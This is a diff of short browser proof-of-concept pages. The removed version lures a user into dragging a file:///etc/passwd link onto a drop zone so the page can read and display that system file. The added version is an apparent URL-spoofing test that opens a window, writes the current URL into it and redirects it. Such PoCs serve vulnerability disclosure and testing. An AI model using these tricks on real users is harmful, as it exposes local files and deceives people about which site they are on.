@@ -1,23 +1,9 @@
-<html>
-  <a id="b" href="file:///etc/passwd">dragme</a>
-  <br><br><br><br><br><br>
-  <div id="c" ondragover="event.preventDefault()">here</div>
-  <div id="o"></div>
-
-  <script>
-    document.getElementById('c').ondrop = function (e) {
-      e.preventDefault();
-      if (!e.dataTransfer.files || e.dataTransfer.files.length === 0) {
-        return;
-      }
-      var reader = new FileReader();
-      reader.onloadend = function() {
-        document.getElementById('o').innerHTML = reader.result;
-      };
-      reader.onerror = function() {
-        document.getElementById('o').innerHTML = 'Error reading file';
-      };
-      reader.readAsText(e.dataTransfer.files[0]);
-    };
-  </script>
-</html>
+<script>
+    function spoof() {
+        var w = open()
+        w.opener = null
+        w.document.write('Current URL: ' + document.URL)
+        w.location = 'https://keitahaga.com/'
+    }
+</script>
+<a href='JavaScript:spoof()'>Go</a>
